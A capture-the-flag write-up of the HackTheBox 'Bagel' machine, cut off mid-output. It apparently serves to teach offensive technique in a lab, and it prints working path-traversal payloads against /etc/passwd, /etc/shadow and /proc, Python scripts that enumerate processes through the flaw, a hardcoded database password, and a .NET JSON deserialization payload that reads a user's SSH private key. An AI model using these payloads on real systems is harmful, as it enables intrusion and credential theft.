# Bagel

https://app.hackthebox.com/machines/Bagel

This is a writeup of HackTheBox's Bagel machine, released on February 19, 2023.


## Reconnaissance

### Nmap

Through an `nmap` scan, we can notice that there are 3 main ports open on the box: 

- Port 22: a seemingly standard SSH service.
- Port 5000: a Microsoft-NetCore service that seems to return `error 400` when probed by `nmap`'s scripts
- Port 8000: a Werkzeug/Python webserver, which redirects to `http://bagel.htb` and interestingly seems to load `index.html` through the `page` parameter: `?page=index.html`

```
──(kali㉿kali)-[~]
└─$ nmap -p5000,8000,22 -sC -sV <IP Address>     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 10:09 EST
Nmap scan report for bagel.htb (10.129.153.14)
Host is up (0.029s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 20 Feb 2023 15:09:58 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 20 Feb 2023 15:10:13 GMT
|     Connection: close
|   Help, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 20 Feb 2023 15:10:23 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 20 Feb 2023 15:09:58 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (version).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Mon, 20 Feb 2023 15:09:58 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Mon, 20 Feb 2023 15:09:53 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
| http-title: Bagel &mdash; Free Website Template, Free HTML5 Template by fr...
|_Requested resource was http://bagel.htb:8000/?page=index.html

```

Next, let's proceed by adding `bagel.htb` to our hosts file, so that our machine can properly resolve HTB's box / ip address:

```
sudo vim /etc/hosts

[...]

<ip address provided by HTB> bagel.htb
```

Now that we can navigate to `bagel.htb:8000` (and redirected to `bagel.htb:8000/?page=index.html`), we can notice a web-page for a fictional bagel shop:

<!-- image -->

Unfortunately, the webpage itself (including its source code) does not seem to contain any juicy information. 

Moving onto the `bagel.htb:8000/orders` endpoint, we can notice the following output:

```
order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels] order #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels] order #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] 
```

Again, apart from telling us that an api endpoint is probably available at `/orders`, the information displayed is not particularly useful for the purposes of <i>hacking the box</i>.

### Local File Inclusion (LFI)

Given that the `bagel.htb:8000/?page=` parameter seemed suspicious from the very beginning, let's attempt to perform a local file inclusion (LFI) via `wfuzz`. An LFI wordlists from the `SecLists` package is leveraged, along with the `--hl 0` parameter which will filter out queries that don't return interesting payloads.

```
└─$ wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt --hl 0 http://bagel.htb:8000/?page=FUZZ 

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bagel.htb:8000/?page=FUZZ
Total requests: 9513

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000007:   200        34 L     72 W       1823 Ch     "../../../../../../etc/passwd"                                                                                                                                             
000000015:   200        34 L     72 W       1823 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                                                                     
000000044:   500        5 L      37 W       265 Ch      "../../../../../etc/shadow"                                                                                                                                                
000000046:   500        5 L      37 W       265 Ch      "../../../../../../../etc/shadow"                                                                                                                                          
000000045:   500        5 L      37 W       265 Ch      "../../../../../../etc/shadow"                                                                                                                                             
000000043:   500        5 L      37 W       265 Ch      "../../../../etc/shadow"                                                                                                                                                   
000000019:   200        34 L     72 W       1823 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                                                                                                         
000000018:   200        34 L     72 W       1823 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                                                                                                            
000000016:   200        34 L     72 W       1823 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                                                                                                  
000000017:   200        34 L     72 W       1823 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                                                                               
000000013:   200        34 L     72 W       1823 Ch     "../../../../../../../../../../../../etc/passwd"                                                                                                                           
000000014:   200        34 L     72 W       1823 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                                                                        
000000011:   200        34 L     72 W       1823 Ch     "../../../../../../../../../../etc/passwd"                                                                                                                                 
000000010:   200        34 L     72 W       1823 Ch     "../../../../../../../../../etc/passwd"                                                                                                                                    
000000012:   200        34 L     72 W       1823 Ch     "../../../../../../../../../../../etc/passwd"                                                                                                                              
000000009:   200        34 L     72 W       1823 Ch     "../../../../../../../../etc/passwd"                                                                                                                                       
000000006:   200        34 L     72 W       1823 Ch     "../../../../../etc/passwd"                                                                                                                                                
000000008:   200        34 L     72 W       1823 Ch     "../../../../../../../etc/passwd"                                                                                                                                          
000000005:   200        34 L     72 W       1823 Ch     "../../../../etc/passwd"                                                                                                                                                   
000000047:   500        5 L      37 W       265 Ch      "../../../../../../../../etc/shadow"                                                                                                                                       
000000053:   500        5 L      37 W       265 Ch      "../../../../../../../../../../../../../../etc/shadow"                                                                                                                     
000000049:   500        5 L      37 W       265 Ch      "../../../../../../../../../../etc/shadow"                                                                                                                                 
000000057:   500        5 L      37 W       265 Ch      "../../../../../../../../../../../../../../../../../../etc/shadow"                                                                                                         
000000056:   500        5 L      37 W       265 Ch      "../../../../../../../../../../../../../../../../../etc/shadow"                                                                                                            
000000055:   500        5 L      37 W       265 Ch      "../../../../../../../../../../../../../../../../etc/shadow"                                                                                                               
000000052:   500        5 L      37 W       265 Ch      "../../../../../../../../../../../../../etc/shadow"                                                                                                                        
000000054:   500        5 L      37 W       265 Ch      "../../../../../../../../../../../../../../../etc/shadow"                                                                                                                  
000000051:   500        5 L      37 W       265 Ch      "../../../../../../../../../../../../etc/shadow"                                                                                                                           
000000048:   500        5 L      37 W       265 Ch      "../../../../../../../../../etc/shadow"                                                                                                                                    
000000050:   500        5 L      37 W       265 Ch      "../../../../../../../../../../../etc/shadow"                                                                                                                              
000000094:   200        55 L     55 W       761 Ch      "../../../../../../../../../../../../../../../../../etc/group"                                                                                                             
000000093:   200        55 L     55 W       761 Ch      "../../../../../../../../../../../../../../../../etc/group"                                                                                                                
000000095:   200        55 L     55 W       761 Ch      "../../../../../../../../../../../../../../../../../../etc/group"                                                                                                          
000000092:   200        55 L     55 W       761 Ch      "../../../../../../../../../../../../../../../etc/group"                                                                                                                   
000000091:   200        55 L     55 W       761 Ch      "../../../../../../../../../../../../../../etc/group"                                                                                                                      
000000090:   200        55 L     55 W       761 Ch      "../../../../../../../../../../../../../etc/group"                                                                                                                         
000000089:   200        55 L     55 W       761 Ch      "../../../../../../../../../../../../etc/group"                                                                                                                            
000000084:   200        55 L     55 W       761 Ch      "../../../../../../../etc/group"                                                                                                                                           
000000086:   200        55 L     55 W       761 Ch      "../../../../../../../../../etc/group"                                                                                                                                     
000000088:   200        55 L     55 W       761 Ch      "../../../../../../../../../../../etc/group"                                                                                                                               
000000085:   200        55 L     55 W       761 Ch      "../../../../../../../../etc/group"                                                                                                                                        
000000087:   200        55 L     55 W       761 Ch      "../../../../../../../../../../etc/group"                                                                                                                                  
000000083:   200        55 L     55 W       761 Ch      "../../../../../../etc/group"                                                                                                                                              
000000082:   200        55 L     55 W       761 Ch      "../../../../../etc/group"                                                                                                                                                 
000000081:   200        55 L     55 W       761 Ch      "../../../../etc/group"                                                                                                                                                    
000000196:   200        1 L      52 W       311 Ch      "../../../../../proc/self/stat"                                                                                                                                            
000000200:   200        1 L      52 W       311 Ch      "../../../../../../../../../proc/self/stat"                                                                                                                                
000000208:   200        1 L      52 W       311 Ch      "../../../../../../../../../../../../../../../../../proc/self/stat"                                                                                                        
000000209:   200        1 L      52 W       311 Ch      "../../../../../../../../../../../../../../../../../../proc/self/stat"                                                                                                     
000000206:   200        1 L      52 W       311 Ch      "../../../../../../../../../../../../../../../proc/self/stat"                                                                                                              
000000207:   200        1 L      52 W       311 Ch      "../../../../../../../../../../../../../../../../proc/self/stat"                                                                                                           
000000205:   200        1 L      52 W       311 Ch      "../../../../../../../../../../../../../../proc/self/stat"                                                                                                                 
000000204:   200        1 L      52 W       311 Ch      "../../../../../../../../../../../../../proc/self/stat"                                                                                                                    
000000202:   200        1 L      52 W       311 Ch      "../../../../../../../../../../../proc/self/stat"                                                                                                                          
000000203:   200        1 L      52 W       311 Ch      "../../../../../../../../../../../../proc/self/stat"                                                                                                                       
000000199:   200        1 L      52 W       311 Ch      "../../../../../../../../proc/self/stat"                                                                                                                                   
000000201:   200        1 L      52 W       311 Ch      "../../../../../../../../../../proc/self/stat"                                                                                                                             
000000198:   200        1 L      52 W       311 Ch      "../../../../../../../proc/self/stat"                                                                                                                                      
000000195:   200        1 L      52 W       311 Ch      "../../../../proc/self/stat"                                                                                                                                               
000000197:   200        1 L      52 W       311 Ch      "../../../../../../proc/self/stat"                                                                                                                                         
000000234:   200        57 L     139 W      1405 Ch     "../../../../../proc/self/status"                                                                                                                                          
000000238:   200        57 L     139 W      1405 Ch     "../../../../../../../../../proc/self/status"                                                                                                                              
000000246:   200        57 L     139 W      1405 Ch     "../../../../../../../../../../../../../../../../../proc/self/status"                                                                                                      
000000245:   200        57 L     139 W      1405 Ch     "../../../../../../../../../../../../../../../../proc/self/status"                                                                                                         
000000247:   200        57 L     139 W      1405 Ch     "../../../../../../../../../../../../../../../../../../proc/self/status"                                                                                                   
000000244:   200        57 L     139 W      1405 Ch     "../../../../../../../../../../../../../../../proc/self/status"                                                                                                            
000000243:   200        57 L     139 W      1405 Ch     "../../../../../../../../../../../../../../proc/self/status"                                                                                                               
000000242:   200        57 L     139 W      1405 Ch     "../../../../../../../../../../../../../proc/self/status"                                                                                                                  
000000240:   200        57 L     139 W      1405 Ch     "../../../../../../../../../../../proc/self/status"                                                                                                                        
000000241:   200        57 L     139 W      1405 Ch     "../../../../../../../../../../../../proc/self/status"                                                                                                                     
000000237:   200        57 L     139 W      1405 Ch     "../../../../../../../../proc/self/status"                                                                                                                                 
000000239:   200        57 L     139 W      1405 Ch     "../../../../../../../../../../proc/self/status"                                                                                                                           
000000236:   200        57 L     139 W      1405 Ch     "../../../../../../../proc/self/status"                                                                                                                                    
000000233:   200        57 L     139 W      1405 Ch     "../../../../proc/self/status"                                                                                                                                             
000000235:   200        57 L     139 W      1405 Ch     "../../../../../../proc/self/status" 

[...]
```

Success! It turns out that numerous LFI strings are possible, but for our purposes we can utilize the most simple one (e.g., `../../../../<root of filesystem>`), which allows us to view `../../../../etc/passwd` and reaveal the user account name `phil`:

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false
```

Next, by looking up standard Werkzeug/Python/Flask installations, one can start to reconstruct the filestructure of the web-app's core files, in the attempt to further understand its mechanics/functioning:

```
└─$ tree
.
├── app
│ 	├── app.py
│ 	└── static
│  		├── index.html
│       └── js
│           ├── main.js
│           └── [...]

```

Amongst these, the most interesting one is evidently `app.py`, which reveals how the `/` (home) and `/orders` pages are populated:

```
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```

### .NET

In our most recent finding, one can read a commented line stating: 

> don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.

This provides a valuable hint on how we should proceed: remember that Microsoft-NetCore service running on port 5000? Well, it seems like it corresponds to the `dotnet` linux command / process that handles requests to/from the `/orders` endpoint.

To find out more details about the `dotnet` process, let's take advantage of the other system files that were revealed by `wfuzz` earlier on (i.e., `../../../../proc/self/stat` and similar). A quick research on [The Linux Documentation Project](https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html), tells us that the `/proc` directory contains numerous files containing details about the processes actively running on the machine, sorted by `PID` (process ID). Perhaps most interestingly, the following files may be of interest in our case:

- /proc/PID/status --> displays basic information about the process itself, including its name
- /proc/PID/cmdline --> reveals the command line arguments (if any) that were utilized whenever launching the process

Thanks to a simple python script we can now fuzz processes currently running on the machine, in the attempt to identify which one(s) are related to .NET:

```
import requests

outfile = open("proc.txt", "a")

for i in range(1, 1000):

	url = "http://bagel.htb:8000/?page=../../../../proc/" + str(i) + "/status"
	req = requests.get(url).text.partition('\n')[0]
	output = str(i) + " " + req

	if ("File not found" not in req):
		print(output)
		outfile.write(output + "\n")

```

```
1 Name:	systemd
2 Name:	kthreadd
3 Name:	rcu_gp
4 Name:	rcu_par_gp
5 Name:	slub_flushwq
6 Name:	netns
8 Name:	kworker/0:0H-events_highpri
10 Name:	mm_percpu_wq
12 Name:	rcu_tasks_kthread
13 Name:	rcu_tasks_rude_kthread
14 Name:	rcu_tasks_trace_kthread
15 Name:	ksoftirqd/0
16 Name:	rcu_preempt
17 Name:	migration/0
19 Name:	cpuhp/0
20 Name:	cpuhp/1
21 Name:	migration/1
22 Name:	ksoftirqd/1
24 Name:	kworker/1:0H-events_highpri
25 Name:	kdevtmpfs
26 Name:	inet_frag_wq
27 Name:	kauditd
28 Name:	oom_reaper
30 Name:	writeback
31 Name:	kcompactd0
32 Name:	ksmd
33 Name:	khugepaged
34 Name:	cryptd
35 Name:	kintegrityd
36 Name:	kblockd
37 Name:	blkcg_punt_bio
39 Name:	tpm_dev_wq
40 Name:	ata_sff
41 Name:	md
42 Name:	edac-poller
43 Name:	watchdogd
44 Name:	kworker/1:1H-kblockd
45 Name:	kswapd0
52 Name:	kthrotld
58 Name:	irq/24-pciehp
59 Name:	irq/25-pciehp
60 Name:	irq/26-pciehp
61 Name:	irq/27-pciehp
62 Name:	irq/28-pciehp
63 Name:	irq/29-pciehp
64 Name:	irq/30-pciehp
65 Name:	irq/31-pciehp
66 Name:	irq/32-pciehp
67 Name:	irq/33-pciehp
68 Name:	irq/34-pciehp
69 Name:	irq/35-pciehp
70 Name:	irq/36-pciehp
71 Name:	irq/37-pciehp
72 Name:	irq/38-pciehp
73 Name:	irq/39-pciehp
74 Name:	irq/40-pciehp
75 Name:	irq/41-pciehp
76 Name:	irq/42-pciehp
77 Name:	irq/43-pciehp
78 Name:	irq/44-pciehp
79 Name:	irq/45-pciehp
80 Name:	irq/46-pciehp
81 Name:	irq/47-pciehp
82 Name:	irq/48-pciehp
83 Name:	irq/49-pciehp
84 Name:	irq/50-pciehp
85 Name:	irq/51-pciehp
86 Name:	irq/52-pciehp
87 Name:	irq/53-pciehp
88 Name:	irq/54-pciehp
89 Name:	irq/55-pciehp
90 Name:	acpi_thermal_pm
91 Name:	xenbus_probe
92 Name:	scsi_eh_0
93 Name:	scsi_tmf_0
94 Name:	scsi_eh_1
95 Name:	scsi_tmf_1
96 Name:	scsi_eh_2
97 Name:	scsi_tmf_2
98 Name:	scsi_eh_3
99 Name:	scsi_tmf_3
100 Name:	scsi_eh_4
101 Name:	scsi_tmf_4
102 Name:	scsi_eh_5
103 Name:	scsi_tmf_5
104 Name:	scsi_eh_6
105 Name:	scsi_tmf_6
106 Name:	scsi_eh_7
107 Name:	scsi_tmf_7
108 Name:	scsi_eh_8
109 Name:	scsi_tmf_8
110 Name:	scsi_eh_9
111 Name:	scsi_tmf_9
112 Name:	scsi_eh_10
113 Name:	scsi_tmf_10
114 Name:	scsi_eh_11
115 Name:	scsi_tmf_11
116 Name:	scsi_eh_12
117 Name:	scsi_tmf_12
118 Name:	scsi_eh_13
119 Name:	scsi_tmf_13
120 Name:	scsi_eh_14
121 Name:	scsi_tmf_14
122 Name:	scsi_eh_15
123 Name:	scsi_tmf_15
124 Name:	scsi_eh_16
125 Name:	scsi_tmf_16
126 Name:	scsi_eh_17
127 Name:	scsi_tmf_17
128 Name:	scsi_eh_18
129 Name:	scsi_tmf_18
130 Name:	scsi_eh_19
131 Name:	scsi_tmf_19
132 Name:	scsi_eh_20
133 Name:	scsi_tmf_20
134 Name:	scsi_eh_21
135 Name:	scsi_tmf_21
136 Name:	scsi_eh_22
137 Name:	scsi_tmf_22
138 Name:	scsi_eh_23
139 Name:	scsi_tmf_23
140 Name:	scsi_eh_24
141 Name:	scsi_tmf_24
142 Name:	scsi_eh_25
143 Name:	scsi_tmf_25
144 Name:	scsi_eh_26
145 Name:	scsi_tmf_26
146 Name:	scsi_eh_27
147 Name:	scsi_tmf_27
148 Name:	scsi_eh_28
149 Name:	scsi_tmf_28
150 Name:	scsi_eh_29
151 Name:	scsi_tmf_29
156 Name:	scsi_eh_30
157 Name:	scsi_tmf_30
158 Name:	scsi_eh_31
160 Name:	scsi_tmf_31
182 Name:	dm_bufio_cache
186 Name:	kstrp
200 Name:	zswap-shrink
201 Name:	kworker/u5:0
312 Name:	kworker/0:1H-xfs-log/dm-0
512 Name:	irq/16-vmwgfx
513 Name:	card0-crtc0
514 Name:	card0-crtc1
515 Name:	card0-crtc2
516 Name:	card0-crtc3
517 Name:	card0-crtc4
518 Name:	card0-crtc5
519 Name:	card0-crtc6
520 Name:	card0-crtc7
524 Name:	mpt_poll_0
526 Name:	mpt/0
557 Name:	scsi_eh_32
558 Name:	scsi_tmf_32
618 Name:	kdmflush/253:0
627 Name:	kdmflush/253:1
644 Name:	xfsalloc
645 Name:	xfs_mru_cache
646 Name:	xfs-buf/dm-0
647 Name:	xfs-conv/dm-0
648 Name:	xfs-reclaim/dm-
649 Name:	xfs-blockgc/dm-
650 Name:	xfs-inodegc/dm-
651 Name:	xfs-log/dm-0
652 Name:	xfs-cil/dm-0
653 Name:	xfsaild/dm-0
757 Name:	systemd-journal
770 Name:	systemd-udevd
795 Name:	irq/60-vmw_vmci
796 Name:	irq/61-vmw_vmci
827 Name:	nfit
833 Name:	xfs-buf/sda1
834 Name:	xfs-conv/sda1
835 Name:	xfs-reclaim/sda
836 Name:	xfs-blockgc/sda
837 Name:	xfs-inodegc/sda
838 Name:	xfs-log/sda1
839 Name:	xfs-cil/sda1
840 Name:	xfsaild/sda1
849 Name:	systemd-oomd
850 Name:	systemd-resolve
851 Name:	systemd-userdbd
852 Name:	auditd
853 Name:	auditd
854 Name:	sedispatch
855 Name:	laurel
856 Name:	auditd
878 Name:	audit_prune_tree
880 Name:	rpciod
881 Name:	xprtiod
884 Name:	NetworkManager
888 Name:	dotnet
890 Name:	python3
891 Name:	irqbalance
892 Name:	mcelog
893 Name:	polkitd
894 Name:	rsyslogd
896 Name:	in:imjournal
897 Name:	rs:main Q:Reg
899 Name:	chronyd
901 Name:	gmain
902 Name:	systemd-logind
903 Name:	VGAuthService
904 Name:	vmtoolsd
906 Name:	abrtd
907 Name:	dbus-broker-lau
916 Name:	dbus-broker
919 Name:	dotnet-ust
920 Name:	dotnet-ust
921 Name:	dotnet
922 Name:	dotnet
923 Name:	dotnet
924 Name:	dotnet
925 Name:	.NET Finalizer
927 Name:	.NET Sockets
930 Name:	.NET ThreadPool
932 Name:	.NET Timer
933 Name:	HangDetector
934 Name:	vmtoolsd
936 Name:	gmain
952 Name:	gmain
954 Name:	gdbus
955 Name:	abrt-dump-journ
958 Name:	abrt-dump-journ
959 Name:	abrt-dump-journ
971 Name:	gmain
972 Name:	gdbus
988 Name:	gmain
989 Name:	JS Helper
990 Name:	JS Helper
992 Name:	gdbus
```

Woohoo! Towards the bottom of this list one can notice numerous `.NET` processes (i.e., PIDs: `884, 888, 919, 920, 921, 922, 923, 924, 925, 927, 930, 932 `).

Let's now query their `/proc/PID/cmdline`:

```
import requests

ids = [884, 888, 919, 920, 921, 922, 923, 924, 925, 927, 930, 932 ]

for i in range(0, len(ids)):

	outfile = open("dotnet/" + str(ids[i]), "w", encoding='utf-8')

	url = "http://bagel.htb:8000/?page=../../../../proc/" + str(ids[i]) + "/cmdline"
	req = requests.get(url)

	print(str(i) + " " + req.text.partition('\n')[0])
	
	outfile.write(req.text)
	outfile.close()
```

Which point towards the following `.dll` file: `/opt/bagel/bin/Debug/net6.0/bagel.dll`

### Bagel.dll

As per usual, let's download the file via the LFI we found previously. To analyze it let's take advantage of [JetBrain's dotPeek](https://www.jetbrains.com/decompiler/), which is essentially an efficient decompiler and does not require any license!

<!-- image -->

On the left hand side of the Assembly Explorer, one can find the decompiled code for `bagel_server`, including:

- Bagel: sets up a WatsonWsServer on port `5000`
- Base: defines the `UserID, Session, Time` parameters
- DB: provides SQL credentials! 
- File: defines the `ReadFile, ReadContent, WriteFile, WriteContent` functions
- Handler: defines JSON SerializerSettings
- Orders: defines the `WriteOrder, ReadOrder` functions

The full files are available [here]:(link) 
<!-- update link -->

## Exploitation

Now that we have a good idea of how the `bagel_server` operates, we can attempt finding and exploiting a vulnerability. 

Unfortunately, while the `DB` file contains SQL credentials, as evidenced by the following comment, no SQL database is seemingly currently in place:

> [Obsolete("The production team has to decide where the database server will be hosted. This method is not fully implemented.")]
    public void DB_connection()
    {
      SqlConnection sqlConnection = new SqlConnection("Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K");
    }

Therefore, we must find another path. It is by inspecting the `Handler` file that one can start thinking about leveraging JSON deserialization vulnerability. More specifically, both the `Serialize` and `Deserialize` functions set the `TypeNameHandling` parameter to `4` instead of the default value `None`, which as specified [here](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm):

> Includes the .NET type name when the type of the object being serialized is not the same as its declared type. Note that this doesn't include the root serialized object by default. To include the root object's type name in JSON you must specify a root type object with SerializeObject(Object, Type, JsonSerializerSettings) or Serialize(JsonWriter, Object, Type)

and [here](https://www.newtonsoft.com/json/help/html/P_Newtonsoft_Json_JsonSerializer_TypeNameHandling.htm): 

> TypeNameHandling should be used with caution when your application deserializes JSON from an external source. Incoming types should be validated with a custom SerializationBinder when deserializing with a value other than None.

```
Syntax: 
public virtual TypeNameHandling TypeNameHandling { get; set; }
```

This seems to be it! `bagel_server` does not seem to include any SerializationBinders (e.g., user input validation from external sources). This means that if we can craft a working malcious request, we could potentially exploit `bagel_servers` functions to read/write and potentially delete arbitrary files on the machine.

See [here](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) for further details.

By looking through all functions, one can quickly realize that the only one that matches the aforementioned syntax (i.e., `{ get; set; }`) is `RemoveOrder`. Furthermore, the ".NET type name when the type of the object being serialized" is `bagel_server.File` and the declared type is `bagel`.

Additionally, in `app.py`, one can read the default syntax expected by .NET. For instance, the same information that is reflected on page `http://bagel.htb/orders` can be queried direclty as follows via `wscat` on port 5000:

```
└─$ wscat -c ws://bagel.htb:5000
Connected (press CTRL+C to quit)
> {"ReadOrder":"orders.txt"}
< {
  "UserId": 0,                                                                                                      
  "Session": "Unauthorized",                                                                                        
  "Time": "10:39:30",                                                                                               
  "RemoveOrder": null,                                                                                              
  "WriteOrder": null,                                                                                               
  "ReadOrder": "order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]\norder #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]\norder #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] "                                                               
}   
>
```

Therefore, given that SSH password login is disabled, one can proceed to enumerate phil's `id_rsa` thanks to the following payload:

```
└─$ wscat -c ws://bagel.htb:5000
Connected (press CTRL+C to quit)
> { "RemoveOrder" : {"$type":"bagel_server.File, Bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}
< {
  "UserId": 0,                                                                                                      
  "Session": "Unauthorized",                                                                                        
  "Time": "10:25:44",                                                                                               
  "RemoveOrder": {                                                                                                  
    "$type": "bagel_server.File, bagel",                                                                            
